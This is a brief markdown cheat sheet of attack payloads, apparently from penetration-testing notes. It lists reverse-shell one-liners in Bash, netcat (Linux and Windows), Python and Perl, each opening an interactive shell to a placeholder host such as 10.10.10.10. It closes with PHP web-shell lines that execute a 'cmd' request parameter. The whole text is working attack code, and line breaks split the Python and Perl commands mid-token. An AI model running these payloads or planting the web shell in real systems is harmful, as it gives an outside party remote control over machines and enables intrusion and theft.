# Reverse Shell
## Bash

```shell
## Bash shell
bash -i >& /dev/tcp/YOUR_HOST/443 0>&1
```

## Netcat without -e ag

```shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f
```

## Netcat Linux

```shell
nc -e /bin/sh 10.10.10.10 443
```

## Netcat Windows

```shell
nc -e cmd.exe 10.10.10.10 4443
```

## Python

```shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.conn
ect(("10.10.10.10",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## Perl
```shell
perl -e 'use Socket;$i="10.10.10.10";$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tc
p"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

# CMD SHell

## PHP

PHP command injection from GET Request
```php
#cmdshell
<?php echo system($_GET["cmd"]);?>

#Alternative
<?php echo shell_exec($_GET["cmd"]);?>
```